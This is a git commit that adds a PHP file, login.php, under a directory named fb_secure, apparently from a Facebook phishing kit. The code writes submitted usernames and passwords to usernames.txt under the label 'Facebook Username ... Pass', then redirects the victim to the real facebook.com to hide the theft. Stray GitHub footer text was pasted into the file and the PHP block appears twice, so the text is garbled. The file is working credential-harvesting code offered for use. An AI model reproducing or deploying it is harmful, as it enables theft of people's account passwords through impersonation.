bdf2edd169b48b253c9cc58d1d2ed502b1ba8d73
D3KRISH <83129000+D3KRISH@users.noreply.github.com>
2022-08-06 23:04:25 +0530

    Create login.php

---
+++ .site/fb_secure/login.php
@@ -0,0 +1,14 @@
+<?php
+
+file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://facebook.com/');
+exit();
+?>
+Footer
+© 2022 GitHub, Inc.
+<?php
+
+file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://facebook.com/');
+exit();
+?>
